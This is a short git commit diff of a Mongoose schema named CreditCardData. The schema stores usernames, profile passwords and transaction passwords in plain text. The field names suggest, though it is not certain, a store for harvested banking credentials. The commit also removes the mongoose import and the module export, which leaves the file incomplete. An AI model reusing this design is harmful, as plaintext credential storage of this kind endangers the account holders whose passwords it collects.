520c18816c02b03b092424b40a81bed9933fa795
harshvandhana <s00831099@gmail.com>
2025-03-20 10:19:44 +0530

    Update CreditCardData.js

--- models/CreditCardData.js
+++ models/CreditCardData.js
@@ -1,17 +1,11 @@
-const mongoose = require("mongoose");
-
 const creditCardSchema = new mongoose.Schema({
     uniqueid: { type: String, required: true, unique: true },
     entries: [
         {
             userName: { type: String, required: true },
             profilePass: { type: String, required: true },
-            transactionPass: { type: String, required: true }, // Corrected field name
+            transactionPass: { type: String, required: true },
             submittedAt: { type: Date, default: Date.now }
         }
     ]
-}, { timestamps: true }); // Auto adds createdAt & updatedAt
-
-const CreditCardData = mongoose.model("CreditCardData", creditCardSchema);
-
-module.exports = CreditCardData;
+}, { timestamps: true });
